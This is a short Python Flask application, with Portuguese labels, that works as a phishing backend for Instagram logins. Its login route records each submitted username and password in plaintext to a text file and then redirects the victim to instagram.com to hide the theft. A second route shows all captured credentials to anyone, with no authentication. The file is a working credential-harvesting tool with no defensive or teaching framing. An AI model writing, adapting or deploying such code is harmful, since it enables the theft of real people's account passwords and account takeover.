from flask import Flask, request, redirect

app = Flask(__name__)

@app.route('/login', methods=['POST'])
def handle_login():
    username = request.form.get('username')
    password = request.form.get('password')

    with open('login_data.txt', 'a', encoding='utf-8') as f:
        f.write(f'Usuário: {username}, Senha: {password}\n')

    return redirect("https://instagram.com", code=302)

@app.route('/ver_dados')
def ver_dados():
    with open('login_data.txt', 'r', encoding='utf-8') as f:
        return f"<pre>{f.read()}</pre>"

if __name__ == '__main__':
    app.run(debug=True)
